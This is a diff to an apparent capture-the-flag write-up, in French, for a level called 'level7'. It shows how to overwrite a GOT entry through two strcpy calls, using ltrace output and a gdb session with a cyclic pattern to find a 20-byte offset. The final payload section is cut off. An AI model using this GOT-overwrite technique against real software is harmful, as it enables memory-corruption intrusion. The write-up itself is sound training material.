@@ -22,6 +22,7 @@ On deduit que l'on doit exploiter les strcpy pour modifier l'entree dans la GOT 
 ...
 ```
 Il nous faudra donc ecrire a l'adresse `0x08049928` l'adresse `0x080484f4`
+
 ## Trouver l'adresse des strcpy
 ```
 > ltrace ./level7 a b
@@ -39,7 +40,20 @@ strcpy(0x0804a038, "b")                                                         
 * `0x0804a018` est l'adresse de destination du premier strcpy
 * `0x0804a038` est l'adresse de destination du deuxieme strcpy
 
-En experimentant on voit qu'il faut un offset de 20 bytes pour overwrite l'adresse de destination du deuxieme strcpy
+
+```
+Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag bbbb
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) info registers
+eax            0x62626262	1650614882
+ecx            0xbffff911	-1073743599
+edx            0x37614136	929120566
+```
+
+0x37614136 nous indique qu'il faut un offset de 20 bytes pour overwrite l'adresse de destination du deuxieme strcpy
+
 
 ## Final
 Les arguments doivent etre dans le format suivant:
